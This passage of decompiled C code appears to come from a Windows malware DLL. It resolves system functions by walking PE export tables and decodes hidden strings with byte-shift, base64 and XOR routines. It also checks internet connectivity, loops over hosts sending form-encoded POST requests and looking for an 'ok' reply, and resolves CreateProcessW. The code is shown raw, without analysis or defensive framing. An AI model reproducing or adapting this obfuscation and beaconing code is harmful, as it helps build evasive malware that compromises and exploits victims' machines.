    uint16_t v41 = *(int16_t *)(2 * v39 + v19 + *(int32_t *)(v38 + 36)); // 0x10005191
    int32_t v42 = *(int32_t *)(*(int32_t *)(v38 + 28) + v19 + 4 * (int32_t)v41); // 0x1000519d
    g141 = v42 + v19;
    __asm_movdqu(0, v40);
    g143 = function_100058f0();
    __asm_movdqu(0, __asm_movdqa_9(g56));
    g145 = function_100058f0();
    __asm_movdqu(0, __asm_movdqa_9(g45));
    g140 = function_100058f0();
    __asm_movdqu(0, __asm_movdqa_9(g61));
    g149 = function_100058f0();
    __asm_movdqu(0, __asm_movdqa_9(0x6e6f436b6365684374656e7265746e49));
    g128 = function_100058f0();
    int32_t v43 = &lpString1; // 0x1000524b
    int32_t v44 = 12; // 0x10005251
    int32_t v45 = (int32_t)&v20 - 4; // 0x10005256
    *(int32_t *)v45 = v43;
    uint32_t v46 = lstrlenA((char *)&g161); // 0x10005259
    int32_t v47 = v45; // 0x10005261
    int32_t v48 = 0; // 0x10005261
    int32_t v49 = v45; // 0x10005261
    char * v50; // 0x10005263
    int32_t v51; // 0x10005266
    int32_t v52; // 0x10005267
    uint32_t v53; // 0x10005268
    if (v46 >= 1) {
        v50 = (char *)(v48 + v43);
        *v50 = *v50 - 1;
        v51 = v48 + 1;
        v52 = v47 - 4;
        *(int32_t *)v52 = v43;
        v53 = lstrlenA((char *)&g161);
        v47 = v52;
        v48 = v51;
        v49 = v52;
        while (v51 < v53) {
            // 0x10005263
            v50 = (char *)(v48 + v43);
            *v50 = *v50 - 1;
            v51 = v48 + 1;
            v52 = v47 - 4;
            *(int32_t *)v52 = v43;
            v53 = lstrlenA((char *)&g161);
            v47 = v52;
            v48 = v51;
            v49 = v52;
        }
    }
    int32_t v54 = v49;
    v44--;
    int32_t v55 = v43 + 80; // 0x10005276
    while (v44 != 0) {
        int32_t v56 = v55;
        v45 = v54 - 4;
        *(int32_t *)v45 = v56;
        v46 = lstrlenA((char *)&g161);
        v47 = v45;
        v48 = 0;
        v49 = v45;
        if (v46 >= 1) {
            v50 = (char *)(v48 + v56);
            *v50 = *v50 - 1;
            v51 = v48 + 1;
            v52 = v47 - 4;
            *(int32_t *)v52 = v56;
            v53 = lstrlenA((char *)&g161);
            v47 = v52;
            v48 = v51;
            v49 = v52;
            while (v51 < v53) {
                // 0x10005263
                v50 = (char *)(v48 + v56);
                *v50 = *v50 - 1;
                v51 = v48 + 1;
                v52 = v47 - 4;
                *(int32_t *)v52 = v56;
                v53 = lstrlenA((char *)&g161);
                v47 = v52;
                v48 = v51;
                v49 = v52;
            }
        }
        // 0x10005272
        v54 = v49;
        v44--;
        v55 = v56 + 80;
    }
    // 0x10005278
    int128_t v57; // bp-428, 0x10004ed0
    __asm_movdqu(v57, __asm_movdqa_9(0x7061203a657079542d746e65746e6f43));
    *(int32_t *)(v54 - 4) = 50;
    int128_t v58; // 0x10004ed0
    __asm_movdqu(v58, __asm_movdqa_9(g36));
    *(int32_t *)(v54 - 8) = 64;
    int128_t v59 = __asm_movdqa_9(0x6465646f636e656c72752d6d726f66); // 0x1000529c
    int128_t v60; // 0x10004ed0
    __asm_movdqu(v60, v59);
    int32_t * memoryHandle = LocalAlloc((int32_t)&g161, (int32_t)&g161); // 0x100052ac
    int32_t v61 = (int32_t)memoryHandle; // bp-1396, 0x100052b2
    *(char *)memoryHandle = 97;
    *(char *)(v61 + 1) = 112;
    *(char *)(v61 + 2) = 112;
    *(char *)(v61 + 3) = 108;
    *(char *)(v61 + 4) = 105;
    *(char *)(v61 + 5) = 99;
    *(char *)(v61 + 6) = 97;
    *(char *)(v61 + 7) = 116;
    *(char *)(v61 + 8) = 105;
    *(char *)(v61 + 9) = 111;
    *(char *)(v61 + 10) = 110;
    *(char *)(v61 + 11) = 47;
    *(char *)(v61 + 12) = 120;
    *(char *)(v61 + 13) = 45;
    *(char *)(v61 + 14) = 119;
    *(char *)(v61 + 15) = 119;
    *(char *)(v61 + 16) = 119;
    *(char *)(v61 + 17) = 45;
    *(char *)(v61 + 18) = 102;
    *(char *)(v61 + 19) = 111;
    *(char *)(v61 + 20) = 114;
    *(char *)(v61 + 21) = 109;
    *(char *)(v61 + 22) = 45;
    *(char *)(v61 + 23) = 117;
    *(char *)(v61 + 24) = 114;
    *(char *)(v61 + 25) = 108;
    *(char *)(v61 + 26) = 101;
    *(char *)(v61 + 27) = 110;
    *(char *)(v61 + 28) = 99;
    *(char *)(v61 + 29) = 111;
    *(char *)(v61 + 30) = 100;
    *(char *)(v61 + 31) = 101;
    *(char *)(v61 + 32) = 100;
    *(char *)(v61 + 33) = 0;
    int32_t v62 = 0x54534f50; // bp-128, 0x1000540f
    *(int32_t *)(v54 - 12) = 0;
    *(int32_t *)(v54 - 16) = 0;
    *(int32_t *)(v54 - 20) = 0;
    *(int32_t *)(v54 - 24) = 1;
    int128_t v63; // bp-244, 0x10004ed0
    int32_t v64 = &v63; // 0x10005429
    *(int32_t *)(v54 - 28) = v64;
    g146 = v64;
    *(int32_t *)(v54 - 32) = 0;
    int32_t v65 = v54 - 36; // 0x1000543c
    int32_t v66; // bp-1440, 0x10004ed0
    *(int32_t *)v65 = (int32_t)&v66;
    int32_t v67; // 0x10004ed0
    int32_t v68; // 0x10004ed0
    uint32_t v69; // 0x10004ed0
    int32_t v70; // 0x10004ed0
    int32_t v71; // 0x10004ed0
    int32_t v72; // 0x10004ed0
    int32_t v73; // bp-1404, 0x10004ed0
    char * v74; // bp-1432, 0x10004ed0
    int32_t v75; // 0x10004ed0
    int32_t v76; // 0x10004ed0
    int32_t v77; // 0x10004ed0
    int32_t lpString1______; // bp-324, 0x10004ed0
    int32_t v78; // 0x10004ed0
    int32_t v79; // 0x10004ed0
    int32_t v80; // 0x10004ed0
    int128_t v81; // 0x10004ed0
    int32_t v82; // 0x10004ed0
    int32_t v83; // 0x10004ed0
    int32_t v84; // 0x10004ed0
    int32_t v85; // 0x10004ed0
    int32_t v86; // 0x10004ed0
    int128_t v87; // 0x10004ed0
    if (g146 == 0) {
        // 0x10005278
        v67 = &v73;
        v87 = v59;
        v72 = v65;
    } else {
        int128_t v88 = __asm_movdqa_9(0x70696b69772e6e652f2f3a7370747468); // 0x1000545e
        *(int32_t *)(v54 - 40) = 0;
        *(int32_t *)(v54 - 44) = 1;
        int32_t v89 = v54 - 48; // 0x1000546c
        *(int32_t *)v89 = v19;
        __asm_movdqu(0, v88);
        int32_t * v90 = (int32_t *)(v54 - 52); // 0x100054aa
        *v90 = 1;
        int32_t * v91 = (int32_t *)(v54 - 56); // 0x100054ab
        *v91 = a1;
        int32_t * v92 = (int32_t *)(v54 - 60); // 0x100054b3
        v79 = &v73;
        *v92 = v79;
        if (function_10007880(0x61696465, 0x67726f2e, 0, (int32_t)&g161) != 0) {
            // 0x100054c1
            *(int32_t *)a2 = 1;
            return _40___security_check_cookie_40_4();
        }
        // 0x100054dc
        *v90 = 1;
        *v91 = a1;
        *v92 = v79;
        int32_t v93 = function_10007880((int32_t)&g161, (int32_t)&g161, (char)&g161, (int32_t)&g161); // 0x100054f4
        if (v93 != 0) {
            // 0x100054c1
            *(int32_t *)a2 = 1;
            return _40___security_check_cookie_40_4();
        }
        // 0x10005500
        *v90 = 1;
        *v91 = a1;
        *v92 = v79;
        int32_t v94 = function_10007880((int32_t)&g161, (int32_t)&g161, (char)&g161, (int32_t)&g161); // 0x10005518
        if (v94 != 0) {
            // 0x100054c1
            *(int32_t *)a2 = 1;
            return _40___security_check_cookie_40_4();
        }
        // 0x10005524
        *v90 = 1;
        *v91 = a1;
        *v92 = v79;
        int32_t v95 = function_10007880((int32_t)&g161, (int32_t)&g161, (char)&g161, (int32_t)&g161); // 0x1000553c
        if (v95 != 0) {
            // 0x100054c1
            *(int32_t *)a2 = 1;
            return _40___security_check_cookie_40_4();
        }
        // 0x1000554c
        *v90 = v79;
        if (function_10007730((int32_t)&g161, (int32_t)&g161) != 0) {
            // 0x100054c1
            *(int32_t *)a2 = 1;
            return _40___security_check_cookie_40_4();
        }
        // 0x1000556c
        *v90 = v79;
        if (function_10007730((int32_t)&g161, (int32_t)&g161) != 0) {
            // 0x100054c1
            *(int32_t *)a2 = 1;
            return _40___security_check_cookie_40_4();
        }
        // 0x1000558c
        *v90 = v79;
        if (function_10007730((int32_t)&g161, (int32_t)&g161) != 0) {
            // 0x100054c1
            *(int32_t *)a2 = 1;
            return _40___security_check_cookie_40_4();
        }
        // 0x100055b1
        v80 = &lpString1______;
        v81 = g62;
        v82 = &v61;
        v83 = &v62;
        v84 = &v57;
        int32_t v96; // bp-427, 0x10004ed0
        v85 = &v96;
        v86 = (int32_t)&v74;
        v68 = 9;
        v70 = v89;
        while (true) {
          lab_0x100055b1:
            // 0x100055b1
            v71 = v70;
            v69 = v68;
            if (v69 != 14) {
                int32_t v97 = v75;
                v76 = v97;
                if (v69 < 14) {
                    int32_t v98 = v71 - 4; // 0x100056bf
                    *(int32_t *)v98 = 80 * v69 + v43;
                    v77 = v97;
                    v78 = v98;
                    goto lab_0x100056cc;
                } else {
                    goto lab_0x100056c8;
                }
            } else {
                // 0x100055ba
                v76 = function_10003640();
                goto lab_0x100056c8;
            }
        }
    }
  lab_0x100055df:
    // 0x100055df
    *(int32_t *)(v72 - 4) = 0;
    *(int32_t *)(v72 - 8) = a1;
    *(int32_t *)(v72 - 12) = v67;
    int32_t v99 = function_10007880((int32_t)&g161, (int32_t)&g161, (char)&g161, (int32_t)&g161); // 0x10005600
    if (v99 != 0) {
        // 0x100058c5
        *(int32_t *)a2 = 0;
        return _40___security_check_cookie_40_4();
    }
    int32_t v100 = v99 + 1; // 0x10005610
    if (v100 >= 6) {
        // 0x1000569c
        return _40___security_check_cookie_40_4();
    }
    int32_t v101 = &lpString1______;
    int128_t v102 = v87; // 0x10004ed0
    int32_t v103 = v72; // 0x10004ed0
    int32_t v104 = v100; // 0x10004ed0
    int32_t v105; // 0x10004ed0
    int32_t v106; // 0x10004ed0
    int32_t v107; // 0x10004ed0
    int128_t v108; // 0x10004ed0
    int128_t v109; // 0x10004ed0
    while (true) {
      lab_0x10005620:
        // 0x10005620
        v105 = v104;
        v106 = v103;
        v108 = v102;
        if (v105 != 5) {
            if (v105 < 5) {
                // 0x10005864
                *(int32_t *)(v106 - 4) = v15 - 1384 + 80 * v105;
                int32_t v110 = v106 - 8; // 0x10005877
                *(int32_t *)v110 = v101;
                lstrcpyA((char *)&g161, (char *)&g161);
                v109 = v108;
                v107 = v110;
                goto lab_0x10005651;
            } else {
                goto lab_0x1000563e;
            }
        } else {
            // 0x10005629
            function_10003640();
            goto lab_0x1000563e;
        }
    }
  lab_0x1000587f:;
    int32_t v111 = *(int32_t *)(v1 + 24); // 0x10005885
    int32_t v112; // 0x10004ed0
    *(int32_t *)(v112 - 20) = *(int32_t *)(v111 + 4);
    char * v113 = inet_ntoa((struct {int32_t e0;}){
        .e0 = (int32_t)&g161
    }); // 0x1000588b
    *(int32_t *)(v112 - 24) = (int32_t)v113;
    lstrcpyA((char *)&g161, (char *)&g161);
    int128_t v114 = __asm_movdqa_9(g62); // 0x1000589a
    *(int32_t *)(v112 - 32) = v19;
    __asm_movdqu(0, v114);
    lstrcpyA((char *)112, (char *)&g161);
    *(int32_t *)(v112 - 40) = v1;
    freeaddrinfo((struct addrinfo *)&g161);
    // 0x100058c5
    *(int32_t *)a2 = 0;
    return _40___security_check_cookie_40_4();
  lab_0x1000563e:;
    int128_t v115 = __asm_xorps(v108, v108); // 0x1000563e
    __asm_movdqu(0, v115);
    int128_t v116; // 0x10004ed0
    __asm_movdqu(v116, v115);
    v109 = v115;
    v107 = v106;
    goto lab_0x10005651;
  lab_0x10005651:
    // 0x10005651
    v112 = v107;
    *(int32_t *)(v112 - 4) = (int32_t)&v1;
    int128_t v117; // bp-1472, 0x10004ed0
    *(int32_t *)(v112 - 8) = (int32_t)&v117;
    *(int32_t *)(v112 - 12) = 0;
    int32_t v118 = v112 - 16; // 0x10005685
    *(int32_t *)v118 = v101;
    if (getaddrinfo(NULL, (char *)1, (struct addrinfo *)6, (struct addrinfo **)&g161) == 0) {
        // break -> 0x1000587f
        goto lab_0x1000587f;
    }
    int32_t v119 = v105 + 1; // 0x10005694
    v102 = v109;
    v103 = v118;
    v104 = v119;
    if (v119 >= 6) {
        // 0x1000569c
        return _40___security_check_cookie_40_4();
    }
    goto lab_0x10005620;
  lab_0x100056c8:;
    int32_t v120 = v71 - 4; // 0x100056c8
    *(int32_t *)v120 = *(int32_t *)(4 * v69 - 56 + v76);
    v77 = v76;
    v78 = v120;
    goto lab_0x100056cc;
  lab_0x100056cc:;
    int32_t v121 = v78;
    *(int32_t *)(v121 - 4) = v80;
    lstrcpyA((char *)&g161, (char *)&g161);
    *(int32_t *)(v121 - 8) = 1;
    *(int32_t *)(v121 - 12) = 0;
    *(int32_t *)(v121 - 16) = 3;
    *(int32_t *)(v121 - 20) = 0;
    *(int32_t *)(v121 - 24) = 0;
    *(int32_t *)(v121 - 28) = 80;
    *(int32_t *)(v121 - 32) = v80;
    *(int32_t *)(v121 - 36) = g146;
    *(int32_t *)(v121 - 40) = v80;
    lstrcpyA((char *)&lpString1______, (char *)&g161);
    int128_t v122 = __asm_movdqa_9(v81); // 0x10005717
    *(int32_t *)(v121 - 48) = v19;
    __asm_movdqu(0, v122);
    lstrcpyA((char *)112, (char *)&g161);
    *(int32_t *)(v121 - 56) = 0;
    *(int32_t *)(v121 - 60) = -0x7c000000;
    *(int32_t *)(v121 - 64) = v82;
    *(int32_t *)(v121 - 68) = 0;
    *(int32_t *)(v121 - 72) = 0;
    *(int32_t *)(v121 - 80) = v83;
    *(int32_t *)(v121 - 84) = v80;
    int32_t v123 = v84;
    int32_t v124 = v123 + 1; // 0x10005772
    while (*(char *)v123 != 0) {
        // 0x10005770
        v123 = v124;
        v124 = v123 + 1;
    }
    // 0x10005777
    *(int32_t *)(v121 - 88) = 0;
    *(int32_t *)(v121 - 92) = 0;
    *(int32_t *)(v121 - 96) = v124 - v85;
    *(int32_t *)(v121 - 100) = v84;
    *(int32_t *)(v121 - 104) = v83;
    *(int32_t *)(v121 - 108) = 0;
    *(int32_t *)(v121 - 112) = 7;
    *(int32_t *)(v121 - 116) = 0;
    *(int32_t *)(v121 - 120) = v83;
    *(int32_t *)(v121 - 124) = g130;
    v74 = NULL;
    *(int32_t *)(v121 - 128) = v86;
    *(int32_t *)(v121 - 132) = 80;
    *(int32_t *)(v121 - 136) = v80;
    *(int32_t *)(v121 - 140) = v83;
    *(int32_t *)(v121 - 144) = (int32_t)"ok";
    *(int32_t *)(v121 - 148) = v80;
    char * v125 = StrStrIA(v74, (char *)&g161); // 0x100057e4
    if (v125 != NULL) {
        if ((int32_t)v125 - v80 < 6) {
            // 0x10005829
            *(int32_t *)(v121 - 152) = v83;
            *(int32_t *)a2 = 1;
            *(int32_t *)(v121 - 156) = v80;
            return _40___security_check_cookie_40_4();
        }
    }
    // 0x100057ff
    *(int32_t *)(v121 - 152) = v83;
    int32_t v126 = v121 - 156; // 0x10005806
    *(int32_t *)v126 = v80;
    int32_t v127 = v69 + 1; // 0x10005818
    v75 = v77;
    v68 = v127;
    v70 = v126;
    v67 = v79;
    v87 = v122;
    v72 = v126;
    if (v127 >= 15) {
        // break -> 0x100055df
        goto lab_0x100055df;
    }
    goto lab_0x100055b1;
}

// Address range: 0x100058f0 - 0x10005927
int32_t function_100058f0(void) {
    // 0x100058f0
    int32_t v1; // 0x100058f0
    int32_t v2 = *(int32_t *)(v1 + 120 + *(int32_t *)(v1 + 60)) + v1; // 0x100058fd
    int32_t v3; // 0x100058f0
    int32_t v4 = function_10007210(v1, (char *)v3); // 0x10005907
    uint16_t v5 = *(int16_t *)(2 * v4 + v1 + *(int32_t *)(v2 + 36)); // 0x10005915
    int32_t v6 = *(int32_t *)(v2 + 28); // 0x10005919
    return *(int32_t *)(v6 + v1 + 4 * (int32_t)v5) + v1;
}

// Address range: 0x10005930 - 0x10005b2a
int32_t function_10005930(void) {
    // 0x10005930
    int32_t v1; // 0x10005930
    if (v1 == 0 || (char)v1 == 0) {
        // 0x10005b23
        return 0;
    }
    char * lpString = (char *)v1; // 0x10005953
    int32_t * memoryHandle = LocalAlloc(64, lstrlenA(lpString) + 1); // 0x10005961
    int32_t v2 = (int32_t)memoryHandle; // 0x10005961
    char v3 = *lpString; // 0x100059a8
    int32_t v4 = 0;
    int32_t v5; // 0x10005930
    while (true) {
      lab_0x10005974:;
        int32_t v6 = v4;
        char v7 = v3; // 0x10005974
        if ((v7 & -33) < 91) {
            // 0x100059a3
            *(char *)(v6 + v2) = v7;
            v5 = v6 + 1;
            goto lab_0x100059a7;
        } else {
            // 0x1000598a
            v5 = v6;
            if (v7 != 61 == v7 > 57 == ((v7 || 4) != 47)) {
                goto lab_0x100059a7;
            } else {
                // 0x100059a3
                *(char *)(v6 + v2) = v7;
                v5 = v6 + 1;
                goto lab_0x100059a7;
            }
        }
    }
  lab_0x100059b0:;
    int32_t v8; // 0x10005930
    if (v4 < 1) {
        // 0x10005b10
        LocalFree(memoryHandle);
        int32_t v9; // 0x10005930
        return v9 - v8;
    }
    char * v10 = (char *)v8; // 0x10005930
    int32_t v11 = 0;
    char v12 = *(char *)(v11 + v2); // 0x100059c0
    int32_t v13 = v11 | 1; // 0x100059c3
    int32_t v14; // 0x10005930
    int32_t v15 = v14 & -0x10000; // 0x100059c6
    int32_t v16 = v15 | 0x4141; // 0x100059ce
    if (v13 < v4) {
        // 0x100059d0
        v16 = v15 | (int32_t)*(char *)(v13 + v2) | 0x4100;
    }
    int32_t v17 = v16; // 0x100059de
    int32_t v18 = v17; // 0x100059d9
    if (v13 + 1 < v4) {
        // 0x100059db
        v18 = 256 * (int32_t)*(char *)((v11 | 2) + v2) | v17 & -0xff01;
    }
    int32_t v19 = v18;
    int32_t v20 = v11 | 3; // 0x100059e2
    int32_t v21 = 0x4100; // 0x100059e7
    if (v20 < v4) {
        // 0x100059e9
        v21 = 256 * (int32_t)*(char *)(v20 + v2);
    }
    uint32_t v22 = v21;
    unsigned char v23 = v12 - 65; // 0x100059f2
    int32_t v24; // 0x10005930
    if (v23 < 26) {
        // 0x100059f8
        v24 = v23;
    } else {
        if (v12 < 123) {
            // 0x10005a05
            v24 = v12 - 71;
        } else {
            if (v12 < 58) {
                // 0x10005a12
                v24 = v12 + 4;
            } else {
                // 0x10005a17
                v24 = v12 != 43 ? 63 : 62;
            }
        }
    }
    char v25 = v19;
    int32_t v26; // 0x10005930
    int32_t v27; // 0x10005a28
    int32_t v28; // 0x10005a35
    int32_t v29; // 0x10005a42
    int32_t v30; // 0x10005a4d
    if (v25 < 91) {
        // 0x10005a28
        v27 = v19 + 191 & 255 | v19 & -256;
        v14 = v27;
        v26 = v27;
    } else {
        if (v25 < 123) {
            // 0x10005a35
            v28 = v19 + 185 & 255 | v19 & -256;
            v14 = v28;
            v26 = v28;
        } else {
            if (v25 < 58) {
                // 0x10005a42
                v29 = v19 + 4 & 255 | v19 & -256;
                v14 = v29;
                v26 = v29;
            } else {
                // 0x10005a47
                v30 = (v25 != 43 ? 63 : 62) | v19 & -256;
                v14 = v30;
                v26 = v30;
            }
        }
    }
    uint32_t v31 = v26 / 256; // 0x10005a50
    char v32 = v31;
    int32_t v33; // 0x10005930
    if (v32 < 91) {
        // 0x10005a58
        v33 = v31 + 191 & 255;
    } else {
        if (v32 < 123) {
            // 0x10005a67
            v33 = v31 + 185 & 255;
        } else {
            if (v32 < 58) {
                // 0x10005a76
                v33 = v31 + 4 & 255;
            } else {
                // 0x10005a7d
                v33 = v32 != 43 ? 63 : 62;
            }
        }
    }
    int32_t v34 = v24 | v22;
    uint32_t v35 = v33;
    char v36 = v22 / 256;
    int32_t v37; // 0x10005930
    if (v36 < 91) {
        // 0x10005a8e
        v37 = v34 + 0xbf00 & 0xff00;
    } else {
        if (v36 < 123) {
            // 0x10005a9d
            v37 = v34 + 0xb900 & 0xff00;
        } else {
            if (v36 < 58) {
                // 0x10005aac
                v37 = v34 + 1024 & 0xff00;
            } else {
                // 0x10005ab3
                v37 = 256 * (int32_t)((v22 & 0xff00) != 0x2b00) | 0x3e00;
            }
        }
    }
    int32_t v38 = v37;
    int32_t v39 = (int32_t)v10; // 0x10005abc
    int32_t v40 = v26 / 16 & 15 | 4 * v34 & 252; // 0x10005ac7
    *v10 = (char)v40;
    int32_t v41 = v39 + 1; // 0x10005acb
    char * v42 = (char *)v41; // 0x10005acc
    int32_t v43 = v14; // 0x10005ad2
    int32_t v44; // 0x10005930
    int32_t v45; // 0x10005930
    char * v46; // 0x10005930
    int32_t v47; // 0x10005adf
    int32_t v48; // 0x10005ae6
    if ((v43 & 0xff00) == 0x3d00) {
        // 0x10005aec
        v14 = v41;
        v45 = v41;
        v46 = v42;
        v44 = v40;
    } else {
        // 0x10005ad7
        v47 = 16 * v43 & 240 | v35 / 4;
        *v42 = (char)v47;
        v48 = v39 + 2;
        v14 = v48;
        v45 = v48;
        v46 = (char *)v48;
        v44 = v47;
    }
    int32_t v49 = v45; // 0x10005af9
    int32_t v50 = v49; // 0x10005af2
    char * v51 = v46; // 0x10005af2
    if ((v22 & 0xff00) != 0x3d00) {
        // 0x10005af4
        *(char *)v49 = (char)((v44 | v38) / 256 | 64 * v35);
        v50 = v14 + 1;
        v51 = (char *)v50;
    }
    char * v52 = v51;
    int32_t v53 = v11 + 4; // 0x10005b02
    v10 = v52;
    while (v53 < v4) {
        // 0x100059c0
        v11 = v53;
        v12 = *(char *)(v11 + v2);
        v13 = v11 | 1;
        v15 = v50 & -0x10000;
        v16 = v15 | 0x4141;
        if (v13 < v4) {
            // 0x100059d0
            v16 = v15 | (int32_t)*(char *)(v13 + v2) | 0x4100;
        }
        // 0x100059d4
        v17 = v16;
        v18 = v17;
        if (v13 + 1 < v4) {
            // 0x100059db
            v18 = 256 * (int32_t)*(char *)((v11 | 2) + v2) | v17 & -0xff01;
        }
        // 0x100059e2
        v19 = v18;
        v20 = v11 | 3;
        v21 = 0x4100;
        if (v20 < v4) {
            // 0x100059e9
            v21 = 256 * (int32_t)*(char *)(v20 + v2);
        }
        // 0x100059f0
        v22 = v21;
        v23 = v12 - 65;
        if (v23 < 26) {
            // 0x100059f8
            v24 = v23;
        } else {
            if (v12 < 123) {
                // 0x10005a05
                v24 = v12 - 71;
            } else {
                if (v12 < 58) {
                    // 0x10005a12
                    v24 = v12 + 4;
                } else {
                    // 0x10005a17
                    v24 = v12 != 43 ? 63 : 62;
                }
            }
        }
        // 0x10005a20
        v25 = v19;
        if (v25 < 91) {
            // 0x10005a28
            v27 = v19 + 191 & 255 | v19 & -256;
            v14 = v27;
            v26 = v27;
        } else {
            if (v25 < 123) {
                // 0x10005a35
                v28 = v19 + 185 & 255 | v19 & -256;
                v14 = v28;
                v26 = v28;
            } else {
                if (v25 < 58) {
                    // 0x10005a42
                    v29 = v19 + 4 & 255 | v19 & -256;
                    v14 = v29;
                    v26 = v29;
                } else {
                    // 0x10005a47
                    v30 = (v25 != 43 ? 63 : 62) | v19 & -256;
                    v14 = v30;
                    v26 = v30;
                }
            }
        }
        // 0x10005a50
        v31 = v26 / 256;
        v32 = v31;
        if (v32 < 91) {
            // 0x10005a58
            v33 = v31 + 191 & 255;
        } else {
            if (v32 < 123) {
                // 0x10005a67
                v33 = v31 + 185 & 255;
            } else {
                if (v32 < 58) {
                    // 0x10005a76
                    v33 = v31 + 4 & 255;
                } else {
                    // 0x10005a7d
                    v33 = v32 != 43 ? 63 : 62;
                }
            }
        }
        // 0x10005a86
        v34 = v24 | v22;
        v35 = v33;
        v36 = v22 / 256;
        if (v36 < 91) {
            // 0x10005a8e
            v37 = v34 + 0xbf00 & 0xff00;
        } else {
            if (v36 < 123) {
                // 0x10005a9d
                v37 = v34 + 0xb900 & 0xff00;
            } else {
                if (v36 < 58) {
                    // 0x10005aac
                    v37 = v34 + 1024 & 0xff00;
                } else {
                    // 0x10005ab3
                    v37 = 256 * (int32_t)((v22 & 0xff00) != 0x2b00) | 0x3e00;
                }
            }
        }
        // 0x10005abc
        v38 = v37;
        v39 = (int32_t)v10;
        v40 = v26 / 16 & 15 | 4 * v34 & 252;
        *v10 = (char)v40;
        v41 = v39 + 1;
        v42 = (char *)v41;
        v43 = v14;
        if ((v43 & 0xff00) == 0x3d00) {
            // 0x10005aec
            v14 = v41;
            v45 = v41;
            v46 = v42;
            v44 = v40;
        } else {
            // 0x10005ad7
            v47 = 16 * v43 & 240 | v35 / 4;
            *v42 = (char)v47;
            v48 = v39 + 2;
            v14 = v48;
            v45 = v48;
            v46 = (char *)v48;
            v44 = v47;
        }
        // 0x10005aef
        v49 = v45;
        v50 = v49;
        v51 = v46;
        if ((v22 & 0xff00) != 0x3d00) {
            // 0x10005af4
            *(char *)v49 = (char)((v44 | v38) / 256 | 64 * v35);
            v50 = v14 + 1;
            v51 = (char *)v50;
        }
        // 0x10005aff
        v52 = v51;
        v53 = v11 + 4;
        v10 = v52;
    }
    // 0x10005b10
    LocalFree(memoryHandle);
    return (int32_t)v52 - v8;
  lab_0x100059a7:
    // 0x100059a7
    v4 = v5;
    int32_t v54; // 0x10005930
    int32_t v55 = v54 + 1; // 0x100059a7
    v3 = *(char *)v55;
    v54 = v55;
    if (v3 == 0) {
        // break -> 0x100059b0
        goto lab_0x100059b0;
    }
    goto lab_0x10005974;
}

// Address range: 0x10005b30 - 0x10005be0
int32_t function_10005b30(void) {
    // 0x10005b30
    int32_t lpString; // 0x10005b30
    int32_t memoryHandle = (int32_t)LocalAlloc(64, lstrlenA((char *)lpString)); // 0x10005b3f
    int32_t v1 = function_10005930(); // 0x10005b4b
    int32_t v2 = v1 - (v1 >> 31); // 0x10005b56
    if (v2 < 2) {
        // 0x10005bda
        return memoryHandle;
    }
    int32_t v3 = 0; // 0x10005b5c
    int32_t v4 = 2 * v3 + memoryHandle;
    char v5 = *(char *)v4; // 0x10005b60
    char v6 = v5 - 48; // 0x10005b63
    char v7 = v6; // 0x10005b68
    if (v6 >= 10) {
        if (v5 < 71) {
            // 0x10005b79
            v7 = v5 - 55;
        } else {
            // 0x10005b81
            v7 = v5 < 103 ? v5 - 87 : 0;
        }
    }
    char v8 = *(char *)(v4 + 1); // 0x10005b92
    char v9 = v8 - 48; // 0x10005b96
    char v10 = v9; // 0x10005b9c
    if (v9 >= 10) {
        if (v8 < 71) {
            // 0x10005bae
            v10 = v8 - 55;
        } else {
            // 0x10005bb6
            v10 = v8 < 103 ? v8 - 87 : 0;
        }
    }
    unsigned char v11 = v10 + 16 * v7 ^ 35; // 0x10005bcf
    *(char *)(v3 + memoryHandle) = v11 / 32 | 8 * v11;
    v3++;
    while (v3 != v2 / 2) {
        // 0x10005b60
        v4 = 2 * v3 + memoryHandle;
        v5 = *(char *)v4;
        v6 = v5 - 48;
        v7 = v6;
        if (v6 >= 10) {
            if (v5 < 71) {
                // 0x10005b79
                v7 = v5 - 55;
            } else {
                // 0x10005b81
                v7 = v5 < 103 ? v5 - 87 : 0;
            }
        }
        // 0x10005b92
        v8 = *(char *)(v4 + 1);
        v9 = v8 - 48;
        v10 = v9;
        if (v9 >= 10) {
            if (v8 < 71) {
                // 0x10005bae
                v10 = v8 - 55;
            } else {
                // 0x10005bb6
                v10 = v8 < 103 ? v8 - 87 : 0;
            }
        }
        // 0x10005bc8
        v11 = v10 + 16 * v7 ^ 35;
        *(char *)(v3 + memoryHandle) = v11 / 32 | 8 * v11;
        v3++;
    }
    // 0x10005bda
    return memoryHandle;
}

// Address range: 0x10005be0 - 0x10006523
int32_t function_10005be0(void) {
    // 0x10005be0
    int32_t v1; // bp-703, 0x10005be0
    _memset(&v1, 0, 99);
    int32_t lpModuleName = 0x6e72656b; // bp-704, 0x10005c15
    int32_t moduleHandle = (int32_t)GetModuleHandleA((char *)&lpModuleName); // 0x10005c41
    int32_t v2 = 0x64616f4c; // bp-808, 0x10005c49
    int32_t v3 = *(int32_t *)(moduleHandle + 120 + *(int32_t *)(moduleHandle + 60)) + moduleHandle; // 0x10005c7b
    int32_t v4 = function_10007210(moduleHandle, (char *)&v2); // 0x10005c87
    uint16_t v5 = *(int16_t *)(2 * v4 + moduleHandle + *(int32_t *)(v3 + 36)); // 0x10005c95
    int32_t v6 = *(int32_t *)(*(int32_t *)(v3 + 28) + moduleHandle + 4 * (int32_t)v5); // 0x10005c9f
    int32_t v7 = v6 + moduleHandle; // 0x10005ca8
    g137 = v7;
    function_10007210(v7, "CreateProcessW");
    int32_t lpBuffer2 = 0x21756654; // bp-600, 0x10005ce9
    int32_t v8 = 0x50667562; // bp-584, 0x10005d17
    int128_t v9 = __asm_movdqa_9(g31); // 0x100060c3
    int32_t v10 = &v8; // 0x10006267
    int32_t v11 = 18; // 0x10006267
    int128_t * v12 = (int128_t *)(v10 - 16); // 0x10006273
    __asm_movdqu(*v12, __asm_psubb(__asm_movdqu_11(*v12), v9));
    int128_t * v13 = (int128_t *)v10; // 0x10006281
    __asm_movdqu(*v13, __asm_psubb(__asm_movdqu_11(*v13), v9));
    v11--;
    v10 += 32;
    while (v11 != 0) {
        // 0x10006270
        v12 = (int128_t *)(v10 - 16);
        __asm_movdqu(*v12, __asm_psubb(__asm_movdqu_11(*v12), v9));
        v13 = (int128_t *)v10;
        __asm_movdqu(*v13, __asm_psubb(__asm_movdqu_11(*v13), v9));
        v11--;
        v10 += 32;
    }
    for (int32_t i = 576; i < 583; i++) {
        // 0x10006292
        int32_t v14; // bp-4, 0x10005be0
        char * v15 = (char *)((int32_t)&v14 - 596 + i); // 0x10006292
        *v15 = *v15 - 1;
    }
    int32_t lpNumberOfBytesWritten = 0; // bp-2120, 0x100062ad
    int32_t lpFilename; // bp-1112, 0x10005be0
